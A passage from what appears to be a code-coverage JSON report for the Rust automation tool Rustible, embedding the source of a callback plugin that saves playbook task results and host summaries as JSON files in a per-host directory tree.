ddress":[29869078],"length":1,"stats":{"Line":1}},{"line":422,"address":[29869170],"length":1,"stats":{"Line":1}},{"line":423,"address":[29869319],"length":1,"stats":{"Line":1}},{"line":424,"address":[29869917,29869691,29869839,29869773],"length":1,"stats":{"Line":1}},{"line":431,"address":[29869359],"length":1,"stats":{"Line":0}},{"line":441,"address":[29870288,29868973],"length":1,"stats":{"Line":2}},{"line":442,"address":[29870330],"length":1,"stats":{"Line":1}},{"line":443,"address":[29870383],"length":1,"stats":{"Line":1}},{"line":444,"address":[29870418,29870493],"length":1,"stats":{"Line":2}},{"line":446,"address":[29870449,29870392],"length":1,"stats":{"Line":0}},{"line":449,"address":[29870695,29870478],"length":1,"stats":{"Line":2}},{"line":450,"address":[29870831],"length":1,"stats":{"Line":1}},{"line":451,"address":[29870884],"length":1,"stats":{"Line":1}},{"line":452,"address":[29870962],"length":1,"stats":{"Line":1}},{"line":453,"address":[29871097],"length":1,"stats":{"Line":1}},{"line":466,"address":[29874160,29873568,29874166],"length":1,"stats":{"Line":1}},{"line":467,"address":[29873608],"length":1,"stats":{"Line":1}},{"line":468,"address":[29874029,29873886,29873821,29874138],"length":1,"stats":{"Line":2}},{"line":472,"address":[29875773,29874384,29875797],"length":1,"stats":{"Line":1}},{"line":480,"address":[29874505],"length":1,"stats":{"Line":1}},{"line":482,"address":[29874788,29874713],"length":1,"stats":{"Line":2}},{"line":483,"address":[29874773],"length":1,"stats":{"Line":1}},{"line":485,"address":[29874795,29874895],"length":1,"stats":{"Line":2}},{"line":486,"address":[29874965,29875128,29874911],"length":1,"stats":{"Line":2}},{"line":487,"address":[29875139,29875077],"length":1,"stats":{"Line":2}},{"line":490,"address":[29875105],"length":1,"stats":{"Line":0}},{"line":495,"address":[29874814],"length":1,"stats":{"Line":1}},{"line":496,"address":[29875172],"length":1,"stats":{"Line":1}},{"line":503,"address":[29875382],"length":1,"stats":{"Line":1}},{"line":504,"address":[29875449],"length":1,"stats":{"Line":1}},{"line":505,"address":[29875468],"length":1,"stats":{"Line":1}},{"line":508,"address":[29875512],"length":1,"stats":{"Line":1}},{"line":511,"address":[29875524],"length":1,"stats":{"Line":1}},{"line":515,"address":[29876605,29876128,29876611],"length":1,"stats":{"Line":1}},{"line":516,"address":[29876142],"length":1,"stats":{"Line":1}},{"line":517,"address":[29876217,29876169],"length":1,"stats":{"Line":2}},{"line":518,"address":[29876233],"length":1,"stats":{"Line":1}},{"line":519,"address":[29876266],"length":1,"stats":{"Line":1}},{"line":520,"address":[29876299],"length":1,"stats":{"Line":1}},{"line":521,"address":[29876328],"length":1,"stats":{"Line":1}},{"line":522,"address":[29876586,29876352,29876443,29876388],"length":1,"stats":{"Line":1}},{"line":523,"address":[29876530],"length":1,"stats":{"Line":1}},{"line":524,"address":[29876553],"length":1,"stats":{"Line":1}},{"line":530,"address":[29859795],"length":1,"stats":{"Line":4}},{"line":531,"address":[30212187,30212097],"length":1,"stats":{"Line":2}},{"line":532,"address":[30212192,30212269],"length":1,"stats":{"Line":2}},{"line":533,"address":[30212331,30212307,30212477,30212607,30212413],"length":1,"stats":{"Line":1}},{"line":536,"address":[29859627],"length":1,"stats":{"Line":4}},{"line":538,"address":[30211348],"length":1,"stats":{"Line":1}},{"line":541,"address":[29859469],"length":1,"stats":{"Line":4}},{"line":542,"address":[30210448,30210353],"length":1,"stats":{"Line":2}},{"line":544,"address":[30210453],"length":1,"stats":{"Line":1}},{"line":545,"address":[30210522],"length":1,"stats":{"Line":1}},{"line":547,"address":[30210606],"length":1,"stats":{"Line":1}},{"line":549,"address":[30210790,30210732],"length":1,"stats":{"Line":2}},{"line":550,"address":[30210896],"length":1,"stats":{"Line":1}},{"line":553,"address":[29859403],"length":1,"stats":{"Line":4}},{"line":554,"address":[30209808,30209898],"length":1,"stats":{"Line":2}},{"line":555,"address":[30209908,30209959],"length":1,"stats":{"Line":2}},{"line":556,"address":[30210175,30210032,30209995],"length":1,"stats":{"Line":3}},{"line":557,"address":[30210135],"length":1,"stats":{"Line":1}},{"line":560,"address":[30210185,30210012],"length":1,"stats":{"Line":2}},{"line":563,"address":[29859549],"length":1,"stats":{"Line":4}},{"line":564,"address":[30211163],"length":1,"stats":{"Line":1}},{"line":567,"address":[29859678],"length":1,"stats":{"Line":4}},{"line":568,"address":[30211535],"length":1,"stats":{"Line":1}},{"line":569,"address":[30211556],"length":1,"stats":{"Line":1}},{"line":572,"address":[30211577,30211694,30211680],"length":1,"stats":{"Line":2}},{"line":573,"address":[30211701],"length":1,"stats":{"Line":1}},{"line":575,"address":[30211686],"length":1,"stats":{"Line":0}},{"line":578,"address":[30211732],"length":1,"stats":{"Line":1}},{"line":581,"address":[30212691,30212672],"length":1,"stats":{"Line":0}},{"line":585,"address":[29859736],"length":1,"stats":{"Line":0}},{"line":591,"address":[29861826,29861520,29861832],"length":1,"stats":{"Line":1}},{"line":593,"address":[29861545],"length":1,"stats":{"Line":1}},{"line":594,"address":[29861575],"length":1,"stats":{"Line":1}},{"line":595,"address":[29861599,29861653],"length":1,"stats":{"Line":2}},{"line":596,"address":[29861681],"length":1,"stats":{"Line":1}},{"line":602,"address":[29880096],"length":1,"stats":{"Line":1}},{"line":603,"address":[29880104],"length":1,"stats":{"Line":1}},{"line":619,"address":[29878240],"length":1,"stats":{"Line":1}},{"line":620,"address":[29878248],"length":1,"stats":{"Line":1}},{"line":624,"address":[29878000],"length":1,"stats":{"Line":1}},{"line":625,"address":[29878014],"length":1,"stats":{"Line":1}},{"line":626,"address":[29878020],"length":1,"stats":{"Line":1}},{"line":630,"address":[29877952],"length":1,"stats":{"Line":1}},{"line":631,"address":[29877966],"length":1,"stats":{"Line":1}},{"line":632,"address":[29877972],"length":1,"stats":{"Line":1}},{"line":636,"address":[29877904],"length":1,"stats":{"Line":1}},{"line":637,"address":[29877912],"length":1,"stats":{"Line":1}},{"line":638,"address":[29877915],"length":1,"stats":{"Line":1}},{"line":642,"address":[29878096],"length":1,"stats":{"Line":1}},{"line":643,"address":[29878105],"length":1,"stats":{"Line":1}},{"line":644,"address":[29878110],"length":1,"stats":{"Line":1}},{"line":648,"address":[29878144],"length":1,"stats":{"Line":0}},{"line":649,"address":[29878158],"length":1,"stats":{"Line":0}},{"line":650,"address":[29878164],"length":1,"stats":{"Line":0}},{"line":654,"address":[29878192],"length":1,"stats":{"Line":0}},{"line":655,"address":[29878206],"length":1,"stats":{"Line":0}},{"line":656,"address":[29878212],"length":1,"stats":{"Line":0}},{"line":660,"address":[29877856],"length":1,"stats":{"Line":1}},{"line":661,"address":[29877870],"length":1,"stats":{"Line":1}},{"line":662,"address":[29877876],"length":1,"stats":{"Line":1}},{"line":666,"address":[29878048],"length":1,"stats":{"Line":0}},{"line":667,"address":[29878062],"length":1,"stats":{"Line":0}},{"line":668,"address":[29878068],"length":1,"stats":{"Line":0}},{"line":672,"address":[29878272],"length":1,"stats":{"Line":1}},{"line":673,"address":[29878284],"length":1,"stats":{"Line":1}},{"line":682,"address":[29878336],"length":1,"stats":{"Line":1}},{"line":683,"address":[29878362],"length":1,"stats":{"Line":1}},{"line":684,"address":[29878377],"length":1,"stats":{"Line":1}},{"line":685,"address":[29878391],"length":1,"stats":{"Line":1}},{"line":687,"address":[29878414],"length":1,"stats":{"Line":1}},{"line":688,"address":[29878442],"length":1,"stats":{"Line":1}},{"line":689,"address":[29878462],"length":1,"stats":{"Line":1}},{"line":690,"address":[29878495],"length":1,"stats":{"Line":1}},{"line":691,"address":[29878515],"length":1,"stats":{"Line":1}},{"line":692,"address":[29878425],"length":1,"stats":{"Line":1}},{"line":693,"address":[29878820],"length":1,"stats":{"Line":1}},{"line":694,"address":[29878843],"length":1,"stats":{"Line":1}},{"line":695,"address":[29878866],"length":1,"stats":{"Line":1}},{"line":696,"address":[29878803],"length":1,"stats":{"Line":1}},{"line":697,"address":[29879121],"length":1,"stats":{"Line":1}},{"line":698,"address":[29879105],"length":1,"stats":{"Line":1}},{"line":699,"address":[29879518],"length":1,"stats":{"Line":1}},{"line":701,"address":[29879353],"length":1,"stats":{"Line":1}},{"line":706,"address":[29877088,29877600,29877594],"length":1,"stats":{"Line":1}},{"line":707,"address":[29877140],"length":1,"stats":{"Line":1}},{"line":709,"address":[29877165],"length":1,"stats":{"Line":1}},{"line":710,"address":[29877211],"length":1,"stats":{"Line":0}},{"line":711,"address":[29877793,29877834,29877185],"length":1,"stats":{"Line":1}},{"line":712,"address":[29877309],"length":1,"stats":{"Line":0}},{"line":713,"address":[29877283,29877774,29877730],"length":1,"stats":{"Line":1}},{"line":714,"address":[29877383],"length":1,"stats":{"Line":0}},{"line":715,"address":[29877357,29877670,29877711],"length":1,"stats":{"Line":1}},{"line":716,"address":[29877484],"length":1,"stats":{"Line":1}},{"line":718,"address":[29877435],"length":1,"stats":{"Line":1}},{"line":723,"address":[29876704],"length":1,"stats":{"Line":1}},{"line":724,"address":[29876776],"length":1,"stats":{"Line":1}},{"line":725,"address":[29876819],"length":1,"stats":{"Line":1}},{"line":726,"address":[29876796],"length":1,"stats":{"Line":1}},{"line":727,"address":[29876868],"length":1,"stats":{"Line":1}},{"line":729,"address":[29876835,29876904],"length":1,"stats":{"Line":2}}],"covered":207,"coverable":245},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","tree.rs"],"content":"//! Tree callback plugin for Rustible.\n//!\n//! This plugin saves execution output to a hierarchical directory structure,\n//! making it easy to browse results for large playbook runs.\n//!\n//! # Directory Structure\n//!\n//! The plugin creates the following structure:\n//!\n//! ```text\n//! tree_root/\n//! |-- _playbook_summary.json\n//! |-- host1/\n//! |   |-- _host_summary.json\n//! |   |-- task_001_install_nginx.json\n//! |   |-- task_002_configure_nginx.json\n//! |   +-- task_003_start_nginx.json\n//! +-- host2/\n//!     |-- _host_summary.json\n//!     |-- task_001_install_nginx.json\n//!     +-- ...\n//! ```\n//!\n//! # Features\n//!\n//! - Hierarchical output: `tree_root/host/task_name.json`\n//! - Task results saved as individual JSON files\n//! - Summary files per host with statistics\n//! - Playbook-level summary with overall results\n//! - Timestamps for forensic analysis\n//! - Works well with large playbook runs\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::TreeCallback;\n//!\n//! let callback = TreeCallback::new(\"/var/log/rustible/runs/2024-01-15-deploy\")?;\n//! executor.with_callback(Box::new(callback));\n//! ```\n\nuse std::collections::HashMap;\nuse std::path::{Path, PathBuf};\nuse std::sync::atomic::{AtomicU32, Ordering};\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse chrono::{DateTime, Utc};\nuse parking_lot::RwLock;\nuse serde::{Deserialize, Serialize};\nuse tokio::fs;\nuse tracing::{debug, error, warn};\n\nuse crate::error::Result;\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Data Structures for Serialization\n// ============================================================================\n\n/// Metadata stored with each task result.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskMetadata {\n    /// Task name from playbook\n    pub task_name: String,\n    /// Host this task ran on\n    pub host: String,\n    /// Sequence number for ordering\n    pub sequence: u32,\n    /// Start timestamp (ISO 8601)\n    pub started_at: DateTime\u003cUtc\u003e,\n    /// End timestamp (ISO 8601)\n    pub completed_at: DateTime\u003cUtc\u003e,\n    /// Duration in milliseconds\n    pub duration_ms: u64,\n    /// Play name this task belongs to\n    pub play_name: Option\u003cString\u003e,\n}\n\n/// Result data stored for each task.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskResultData {\n    /// Metadata about the task execution\n    pub metadata: TaskMetadata,\n    /// Whether the task succeeded\n    pub success: bool,\n    /// Whether the task made changes\n    pub changed: bool,\n    /// Whether the task was skipped\n    pub skipped: bool,\n    /// Result message\n    pub message: String,\n    /// Additional data from the module\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub data: Option\u003cserde_json::Value\u003e,\n    /// Warnings from the module\n    #[serde(skip_serializing_if = \"Vec::is_empty\", default)]\n    pub warnings: Vec\u003cString\u003e,\n    /// Handlers to notify\n    #[serde(skip_serializing_if = \"Vec::is_empty\", default)]\n    pub notify: Vec\u003cString\u003e,\n}\n\n/// Statistics tracked per host.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct TreeHostStats {\n    /// Total tasks executed\n    pub total: u32,\n    /// Successful tasks (no changes)\n    pub ok: u32,\n    /// Tasks that made changes\n    pub changed: u32,\n    /// Failed tasks\n    pub failed: u32,\n    /// Skipped tasks\n    pub skipped: u32,\n    /// Unreachable attempts\n    pub unreachable: u32,\n    /// Total execution time in milliseconds\n    pub total_duration_ms: u64,\n}\n\n/// Host summary saved to _host_summary.json.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TreeHostSummary {\n    /// Hostname\n    pub host: String,\n    /// Execution statistics\n    pub stats: TreeHostStats,\n    /// When execution started for this host\n    pub started_at: DateTime\u003cUtc\u003e,\n    /// When execution completed for this host\n    pub completed_at: DateTime\u003cUtc\u003e,\n    /// List of task files in order\n    pub task_files: Vec\u003cString\u003e,\n    /// Facts gathered for this host (if any)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub facts: Option\u003cserde_json::Value\u003e,\n}\n\n/// Playbook summary saved to _playbook_summary.json.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TreePlaybookSummary {\n    /// Playbook name\n    pub playbook: String,\n    /// Overall success status\n    pub success: bool,\n    /// When playbook execution started\n    pub started_at: DateTime\u003cUtc\u003e,\n    /// When playbook execution completed\n    pub completed_at: DateTime\u003cUtc\u003e,\n    /// Total duration in milliseconds\n    pub duration_ms: u64,\n    /// Aggregate statistics across all hosts\n    pub total_stats: TreeHostStats,\n    /// Per-host statistics\n    pub hosts: HashMap\u003cString, TreeHostStats\u003e,\n    /// List of plays executed\n    pub plays: Vec\u003cString\u003e,\n}\n\n// ============================================================================\n// Internal State\n// ============================================================================\n\n/// Internal state for tracking a host during execution.\n#[derive(Debug)]\nstruct HostState {\n    /// Statistics for this host\n    stats: TreeHostStats,\n    /// When we started executing on this host\n    started_at: DateTime\u003cUtc\u003e,\n    /// Task files written for this host\n    task_files: Vec\u003cString\u003e,\n    /// Current task sequence number\n    task_sequence: AtomicU32,\n    /// Facts gathered for this host\n    facts: Option\u003cserde_json::Value\u003e,\n}\n\nimpl Default for HostState {\n    fn default() -\u003e Self {\n        Self {\n            stats: TreeHostStats::default(),\n            started_at: Utc::now(),\n            task_files: Vec::new(),\n            task_sequence: AtomicU32::new(0),\n            facts: None,\n        }\n    }\n}\n\n/// Configuration options for the tree callback.\n#[derive(Debug, Clone)]\npub struct TreeConfig {\n    /// Whether to save facts in host summaries\n    pub save_facts: bool,\n    /// Whether to save task data (additional module output)\n    pub save_task_data: bool,\n    /// Maximum task name length in filenames\n    pub max_task_name_len: usize,\n    /// Whether to create timestamped subdirectory\n    pub use_timestamp_subdir: bool,\n}\n\nimpl Default for TreeConfig {\n    fn default() -\u003e Self {\n        Self {\n            save_facts: true,\n            save_task_data: true,\n            max_task_name_len: 80,\n            use_timestamp_subdir: false,\n        }\n    }\n}\n\n// ============================================================================\n// Tree Callback Implementation\n// ============================================================================\n\n/// Tree callback plugin that saves output to a directory structure.\n///\n/// This callback organizes execution results in a browsable tree structure,\n/// with each host getting its own directory and each task saved as a JSON file.\n///\n/// # Design Principles\n///\n/// 1. **Hierarchical Organization**: Results are organized by host, then by task\n/// 2. **JSON Format**: All output is machine-readable JSON\n/// 3. **Sequence Numbering**: Tasks are numbered for ordering\n/// 4. **Summary Files**: Both per-host and playbook-level summaries\n/// 5. **Timestamps**: Full timing information for analysis\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::TreeCallback;\n///\n/// // Create with auto-generated run directory\n/// let callback = TreeCallback::new_with_timestamp(\"/var/log/rustible/runs\")?;\n///\n/// // Or specify exact path\n/// let callback = TreeCallback::new(\"/var/log/rustible/runs/my-deploy\")?;\n///\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct TreeCallback {\n    /// Root directory for the tree structure\n    tree_root: PathBuf,\n    /// Configuration options\n    config: TreeConfig,\n    /// Per-host state tracking\n    host_states: Arc\u003cRwLock\u003cHashMap\u003cString, HostState\u003e\u003e\u003e,\n    /// Playbook start time\n    playbook_started_at: Arc\u003cRwLock\u003cOption\u003cDateTime\u003cUtc\u003e\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Current play name\n    current_play: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// List of plays executed\n    plays: Arc\u003cRwLock\u003cVec\u003cString\u003e\u003e\u003e,\n    /// Overall start time for duration calculation\n    start_instant: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Whether any failures occurred\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n}\n\nimpl TreeCallback {\n    /// Creates a new tree callback with the specified root directory.\n    ///\n    /// The directory will be created if it doesn't exist.\n    ///\n    /// # Arguments\n    ///\n    /// * `tree_root` - Path to the root directory for output\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = TreeCallback::new(\"/var/log/rustible/runs/2024-01-15\")?;\n    /// ```\n    pub fn new(tree_root: impl AsRef\u003cPath\u003e) -\u003e Result\u003cSelf\u003e {\n        Self::with_config(tree_root, TreeConfig::default())\n    }\n\n    /// Creates a new tree callback with custom configuration.\n    ///\n    /// # Arguments\n    ///\n    /// * `tree_root` - Path to the root directory for output\n    /// * `config` - Configuration options\n    pub fn with_config(tree_root: impl AsRef\u003cPath\u003e, config: TreeConfig) -\u003e Result\u003cSelf\u003e {\n        let tree_root = tree_root.as_ref().to_path_buf();\n\n        Ok(Self {\n            tree_root,\n            config,\n            host_states: Arc::new(RwLock::new(HashMap::new())),\n            playbook_started_at: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            current_play: Arc::new(RwLock::new(None)),\n            plays: Arc::new(RwLock::new(Vec::new())),\n            start_instant: Arc::new(RwLock::new(None)),\n            has_failures: Arc::new(RwLock::new(false)),\n        })\n    }\n\n    /// Creates a new tree callback with an auto-generated timestamped subdirectory.\n    ///\n    /// This creates a directory like `base_path/2024-01-15T10-30-00Z` for each run.\n    ///\n    /// # Arguments\n    ///\n    /// * `base_path` - Base path where timestamped directories will be created\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// // Creates /var/log/rustible/runs/2024-01-15T10-30-00Z/\n    /// let callback = TreeCallback::new_with_timestamp(\"/var/log/rustible/runs\")?;\n    /// ```\n    pub fn new_with_timestamp(base_path: impl AsRef\u003cPath\u003e) -\u003e Result\u003cSelf\u003e {\n        let timestamp = Utc::now().format(\"%Y-%m-%dT%H-%M-%SZ\").to_string();\n        let tree_root = base_path.as_ref().join(timestamp);\n        Self::new(tree_root)\n    }\n\n    /// Returns the root directory path for this callback.\n    #[must_use]\n    pub fn tree_root(\u0026self) -\u003e \u0026Path {\n        \u0026self.tree_root\n    }\n\n    /// Returns whether any failures occurred during execution.\n    #[must_use]\n    pub fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read()\n    }\n\n    /// Gets the directory path for a specific host.\n    fn host_dir(\u0026self, host: \u0026str) -\u003e PathBuf {\n        self.tree_root.join(sanitize_filename(host))\n    }\n\n    /// Generates a filename for a task result.\n    fn task_filename(\u0026self, sequence: u32, task_name: \u0026str) -\u003e String {\n        let sanitized_name = sanitize_filename(task_name);\n        // Truncate task name if too long (keep filenames reasonable)\n        let truncated = if sanitized_name.len() \u003e self.config.max_task_name_len {\n            \u0026sanitized_name[..self.config.max_task_name_len]\n        } else {\n            \u0026sanitized_name\n        };\n        format!(\"task_{:03}_{}.json\", sequence, truncated)\n    }\n\n    /// Writes a task result to the appropriate file.\n    async fn write_task_result(\n        \u0026self,\n        host: \u0026str,\n        task_name: \u0026str,\n        sequence: u32,\n        result: TaskResultData,\n    ) -\u003e std::io::Result\u003cString\u003e {\n        let host_dir = self.host_dir(host);\n        fs::create_dir_all(\u0026host_dir).await?;\n\n        let filename = self.task_filename(sequence, task_name);\n        let file_path = host_dir.join(\u0026filename);\n\n        let json = serde_json::to_string_pretty(\u0026result)\n            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;\n\n        fs::write(\u0026file_path, json).await?;\n        debug!(\"Wrote task result to {}\", file_path.display());\n\n        Ok(filename)\n    }\n\n    /// Writes the host summary file.\n    async fn write_host_summary(\n        \u0026self,\n        host: \u0026str,\n        summary: TreeHostSummary,\n    ) -\u003e std::io::Result\u003c()\u003e {\n        let host_dir = self.host_dir(host);\n        let file_path = host_dir.join(\"_host_summary.json\");\n\n        let json = serde_json::to_string_pretty(\u0026summary)\n            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;\n\n        fs::write(\u0026file_path, json).await?;\n        debug!(\"Wrote host summary to {}\", file_path.display());\n\n        Ok(())\n    }\n\n    /// Writes the playbook summary file.\n    async fn write_playbook_summary(\u0026self, summary: TreePlaybookSummary) -\u003e std::io::Result\u003c()\u003e {\n        let file_path = self.tree_root.join(\"_playbook_summary.json\");\n\n        let json = serde_json::to_string_pretty(\u0026summary)\n            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;\n\n        fs::write(\u0026file_path, json).await?;\n        debug!(\"Wrote playbook summary to {}\", file_path.display());\n\n        Ok(())\n    }\n}\n\nimpl Clone for TreeCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            tree_root: self.tree_root.clone(),\n            config: self.config.clone(),\n            host_states: Arc::clone(\u0026self.host_states),\n            playbook_started_at: Arc::clone(\u0026self.playbook_started_at),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            current_play: Arc::clone(\u0026self.current_play),\n            plays: Arc::clone(\u0026self.plays),\n            start_instant: Arc::clone(\u0026self.start_instant),\n            has_failures: Arc::clone(\u0026self.has_failures),\n        }\n    }\n}\n\nimpl Default for TreeCallback {\n    fn default() -\u003e Self {\n        Self::new(\"/tmp/rustible-tree\").expect(\"Failed to create default TreeCallback\")\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for TreeCallback {\n    /// Called when a playbook starts - creates the root directory.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        // Create the tree root directory\n        if let Err(e) = fs::create_dir_all(\u0026self.tree_root).await {\n            error!(\n                \"TreeCallback: Failed to create tree root {}: {}\",\n                self.tree_root.display(),\n                e\n            );\n            return;\n        }\n\n        debug!(\n            \"TreeCallback: Created tree root at {}\",\n            self.tree_root.display()\n        );\n\n        // Initialize state\n        *self.playbook_started_at.write() = Some(Utc::now());\n        *self.playbook_name.write() = Some(name.to_string());\n        *self.start_instant.write() = Some(Instant::now());\n\n        // Clear state from previous runs\n        self.host_states.write().clear();\n        self.plays.write().clear();\n        *self.has_failures.write() = false;\n    }\n\n    /// Called when a playbook ends - writes final summaries.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let now = Utc::now();\n\n        // Collect all data under the lock, then release before async operations\n        let (host_summaries, total_stats, host_stats_map, started_at, duration_ms, plays) = {\n            let host_states = self.host_states.read();\n            let started_at = *self.playbook_started_at.read();\n            let start_instant = *self.start_instant.read();\n            let plays = self.plays.read().clone();\n\n            // Collect host summaries\n            let mut summaries = Vec::new();\n            for (host, state) in host_states.iter() {\n                let facts = if self.config.save_facts {\n                    state.facts.clone()\n                } else {\n                    None\n                };\n\n                let summary = TreeHostSummary {\n                    host: host.clone(),\n                    stats: state.stats.clone(),\n                    started_at: state.started_at,\n                    completed_at: now,\n                    task_files: state.task_files.clone(),\n                    facts,\n                };\n                summaries.push((host.clone(), summary));\n            }\n\n            // Calculate aggregate statistics\n            let mut total_stats = TreeHostStats::default();\n            let mut host_stats_map = HashMap::new();\n\n            for (host, state) in host_states.iter() {\n                total_stats.total += state.stats.total;\n                total_stats.ok += state.stats.ok;\n                total_stats.changed += state.stats.changed;\n                total_stats.failed += state.stats.failed;\n                total_stats.skipped += state.stats.skipped;\n                total_stats.unreachable += state.stats.unreachable;\n                total_stats.total_duration_ms += state.stats.total_duration_ms;\n                host_stats_map.insert(host.clone(), state.stats.clone());\n            }\n\n            // Calculate playbook duration\n            let duration_ms = start_instant\n                .map(|start| start.elapsed().as_millis() as u64)\n                .unwrap_or(0);\n\n            (\n                summaries,\n                total_stats,\n                host_stats_map,\n                started_at,\n                duration_ms,\n                plays,\n            )\n        };\n        // Lock released here\n\n        // Write host summaries (async operations now safe)\n        for (host, summary) in host_summaries {\n            if let Err(e) = self.write_host_summary(\u0026host, summary).await {\n                error!(\n                    \"TreeCallback: Failed to write host summary for {}: {}\",\n                    host, e\n                );\n            }\n        }\n\n        // Write playbook summary\n        let summary = TreePlaybookSummary {\n            playbook: name.to_string(),\n            success,\n            started_at: started_at.unwrap_or_else(Utc::now),\n            completed_at: now,\n            duration_ms,\n            total_stats,\n            hosts: host_stats_map,\n            plays,\n        };\n\n        if let Err(e) = self.write_playbook_summary(summary).await {\n            error!(\"TreeCallback: Failed to write playbook summary: {}\", e);\n        }\n\n        debug!(\n            \"TreeCallback: Playbook '{}' completed, wrote summaries to {}\",\n            name,\n            self.tree_root.display()\n        );\n    }\n\n    /// Called when a play starts - records the play name.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Update current play\n        *self.current_play.write() = Some(name.to_string());\n\n        // Add to plays list\n        {\n            let mut plays = self.plays.write();\n            if !plays.contains(\u0026name.to_string()) {\n                plays.push(name.to_string());\n            }\n        }\n\n        // Initialize host states for all hosts in this play\n        let mut host_states = self.host_states.write();\n        for host in hosts {\n            host_states.entry(host.clone()).or_default();\n        }\n\n        debug!(\n            \"TreeCallback: Play '{}' started with {} hosts\",\n            name,\n            hosts.len()\n        );\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, name: \u0026str, _success: bool) {\n        debug!(\"TreeCallback: Play '{}' ended\", name);\n    }\n\n    /// Called when a task starts - currently no action needed.\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Task start is recorded when the task completes with full timing info\n    }\n\n    /// Called when a task completes - writes the task result to a file.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let now = Utc::now();\n        let current_play = self.current_play.read().clone();\n\n        // Get or create host state and update it\n        let sequence = {\n            let mut host_states = self.host_states.write();\n            let host_state = host_states.entry(result.host.clone()).or_default();\n\n            // Increment sequence and get the current value\n            let seq = host_state.task_sequence.fetch_add(1, Ordering::SeqCst);\n\n            // Update statistics\n            host_state.stats.total += 1;\n            if result.result.skipped {\n                host_state.stats.skipped += 1;\n            } else if !result.result.success {\n                host_state.stats.failed += 1;\n            } else if result.result.changed {\n                host_state.stats.changed += 1;\n            } else {\n                host_state.stats.ok += 1;\n            }\n            host_state.stats.total_duration_ms += result.duration.as_millis() as u64;\n\n            seq\n        };\n\n        // Mark failures\n        if !result.result.success {\n            *self.has_failures.write() = true;\n        }\n\n        // Calculate task started_at from completion time and duration\n        let started_at = now - chrono::Duration::from_std(result.duration).unwrap_or_default();\n\n        // Build task result data\n        let task_data = TaskResultData {\n            metadata: TaskMetadata {\n                task_name: result.task_name.clone(),\n                host: result.host.clone(),\n                sequence,\n                started_at,\n                completed_at: now,\n                duration_ms: result.duration.as_millis() as u64,\n                play_name: current_play,\n            },\n            success: result.result.success,\n            changed: result.result.changed,\n            skipped: result.result.skipped,\n            message: result.result.message.clone(),\n            data: if self.config.save_task_data {\n                result.result.data.clone()\n            } else {\n                None\n            },\n            warnings: result.result.warnings.clone(),\n            notify: result.notify.clone(),\n        };\n\n        // Write the task result file\n        match self\n            .write_task_result(\u0026result.host, \u0026result.task_name, sequence, task_data)\n            .await\n        {\n            Ok(filename) =\u003e {\n                // Record the filename in host state\n                let mut host_states = self.host_states.write();\n                if let Some(host_state) = host_states.get_mut(\u0026result.host) {\n                    host_state.task_files.push(filename);\n                }\n            }\n            Err(e) =\u003e {\n                error!(\n                    \"TreeCallback: Failed to write task result for {} on {}: {}\",\n                    result.task_name, result.host, e\n                );\n            }\n        }\n    }\n\n    /// Called when a handler is triggered - logged in task results.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        debug!(\"TreeCallback: Handler '{}' triggered\", name);\n    }\n\n    /// Called when facts are gathered - stores facts for the host summary.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        if !self.config.save_facts {\n            return;\n        }\n\n        let mut host_states = self.host_states.write();\n        if let Some(host_state) = host_states.get_mut(host) {\n            // Convert facts to JSON value for storage\n            match serde_json::to_value(facts) {\n                Ok(facts_json) =\u003e {\n                    host_state.facts = Some(facts_json);\n                    debug!(\"TreeCallback: Stored facts for host '{}'\", host);\n                }\n                Err(e) =\u003e {\n                    warn!(\n                        \"TreeCallback: Failed to serialize facts for {}: {}\",\n                        host, e\n                    );\n                }\n            }\n        }\n    }\n}\n\n// ============================================================================\n// Unreachable Callback Trait\n// ============================================================================\n\n/// Trait extension for handling unreachable hosts.\n#[async_trait]\npub trait TreeUnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl TreeUnreachableCallback for TreeCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        let now = Utc::now();\n        let current_play = self.current_play.read().clone();\n\n        // Get or create host state and update unreachable count\n        let sequence = 